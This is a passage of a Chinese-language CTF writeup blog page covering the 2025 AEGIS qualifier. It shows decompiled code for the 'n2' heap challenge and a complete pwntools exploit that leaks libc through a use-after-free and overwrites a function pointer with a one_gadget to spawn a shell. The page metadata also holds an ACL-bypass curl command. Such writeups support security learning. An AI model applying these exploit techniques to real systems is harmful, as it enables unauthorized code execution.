class="type">char</span>&gt;&gt;);</span><br><span class="line">      <span class="built_in">free</span>(ptr-&gt;note);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Deletion aborted. Please try again later.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v14 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>show note 就是輸入 index，他會去找 function pointer call 他<br>把你的 note 內容輸出出來  </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">show_note</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  __int64 cout_content; <span class="comment">// rax</span></span><br><span class="line">  metadata **v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Enter note index to show: &quot;</span>);</span><br><span class="line">  std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;idx);</span><br><span class="line">  index = idx;</span><br><span class="line">  <span class="keyword">if</span> ( index &gt;= std::vector&lt;Note *&gt;::<span class="built_in">size</span>(&amp;notes) || !*(_QWORD *)std::vector&lt;Note *&gt;::<span class="keyword">operator</span>[](&amp;notes, idx) )<span class="comment">// if(index &gt;= notes.size() || !notes[idx])</span></span><br><span class="line">  &#123;</span><br><span class="line">    cout_content = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Invalid index or note already deleted.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (metadata **)std::vector&lt;Note *&gt;::<span class="keyword">operator</span>[](&amp;notes, idx);</span><br><span class="line">    (*v3)-&gt;<span class="built_in">func_ptr</span>();</span><br><span class="line">    v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    v5 = std::vector&lt;Note *&gt;::<span class="keyword">operator</span>[](&amp;notes, idx);</span><br><span class="line">    cout_content = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v4, *(_QWORD *)(*(_QWORD *)v5 + <span class="number">8LL</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(cout_content, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>思路基本上就是 UAF leak libc<br>UAF 覆蓋掉 function pointer 成 one gadget<br>就可以開一個 shell 了  </p>
+<p>詳見腳本</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.sendline(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendlineafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">after, payload</span>): <span class="keyword">return</span> r.sendafter(after, payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcl</span>(): <span class="keyword">return</span> r.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcls</span>(<span class="params">num</span>): <span class="keyword">return</span> r.recvlines(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rcu</span>(<span class="params">payload</span>): <span class="keyword">return</span> r.recvuntil(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ita</span>(): <span class="keyword">return</span> r.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cl</span>(): <span class="keyword">return</span> r.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tsl</span>(): <span class="keyword">return</span> time.sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">r</span>):</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p_c</span>(<span class="params">r,cmd</span>):</span><br><span class="line">    gdb.attach(r,cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">split_nc</span>(<span class="params">nc_str</span>):</span><br><span class="line">    nc_str=nc_str.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> [nc_str[<span class="number">1</span>],nc_str[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    r=process(<span class="string">&#x27;./n2&#x27;</span>)</span><br><span class="line">    a=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n/srop)&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> a==<span class="string">&#x27;srop&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">else</span>:                                           </span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc 0.cloud.chals.io 28850&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">### attach</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">input</span>(<span class="string">&#x27;attach?(y/n)&#x27;</span>) == <span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">    p(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### heap IO</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size:<span class="built_in">int</span>,content:<span class="built_in">str</span></span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx:<span class="built_in">int</span> </span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;delete: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx:<span class="built_in">int</span></span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;show: &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">### exploit</span></span><br><span class="line"></span><br><span class="line">libc_off = <span class="number">0x203b73</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">rcu(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">leak = rcl().strip()</span><br><span class="line"></span><br><span class="line">leaklibc = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libcbase = leaklibc - libc_off</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(libcbase + <span class="number">0xef4ce</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### interactive</span></span><br><span class="line">ita()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>AEGIS{Wh0_the_h31l_let_you_m4ke_tHe_d3cision}</p>
+</blockquote>
+<h2 id="after-all"><a href="#after-all" class="headerlink" title="after all"></a>after all</h2><p>冷知識:<br>泡芙阿姨 + open 醬 猜工具  </p>
+<p>ans: openpuff (from misc chalenge)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/images/posts_cover/os-arch/126727093_p0_master1200.jpg" data-sizes="auto" alt="speed-run-r1rn-kernel-challenge" class="lazyload">
+        
+        <a href="/2025/10/24/speed-run-r1rn-kernel-challenge/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            speed-run-r1rn-kernel-challenge
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/HITCONCTF/HITCONCTF.png" data-sizes="auto" alt="2025-HITCON-CTF-Writeup" class="lazyload">
+      
+      <a href="/2025/10/24/2025-HITCON-CTF-Writeup/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          2025-HITCON-CTF-Writeup
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        201.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        17:40
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-%E7%A5%9E%E7%9B%BE%E6%9D%AF-Qual-writeup"><span class="toc-number">1.</span> <span class="toc-text">2025 神盾杯 Qual - writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HiProxy"><span class="toc-number">2.</span> <span class="toc-text">HiProxy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#n2"><span class="toc-number">3.</span> <span class="toc-text">n2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#analyze"><span class="toc-number">3.1.</span> <span class="toc-text">analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#attack"><span class="toc-number">3.2.</span> <span class="toc-text">attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">3.3.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after-all"><span class="toc-number">3.4.</span> <span class="toc-text">after all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">84</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "2025-AEGIS-CTF-writeup",
+          url: "http://example.com/2025/10/24/2025-AEGIS-CTF-writeup/",
+          excerpt: "",
+          description: "",
+          stripContent: "2025 神盾杯 Qual - writeup Author: 堇姬 Naup  跟 CakeisTheFake 拿了第三名     高速 speedrun writeup HiProxyACL rules 擋下了訪問 admin直接 urlencode bypasscurl -i https://aegis2025-web-ha.chals.io/%61dmin    AEGIS{H77P_r3QU357_5MU6611N6_5UCC355}  n2analyzemain function 提",
+          date: "Fri Oct 24 2025 10:01:05 GMT+0800",
+          updated: "Fri Oct 24 2025 10:11:34 GMT+0800",
+          cover: "/images/posts_cover/AEGISCTF/AEGIS-CTF.png",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
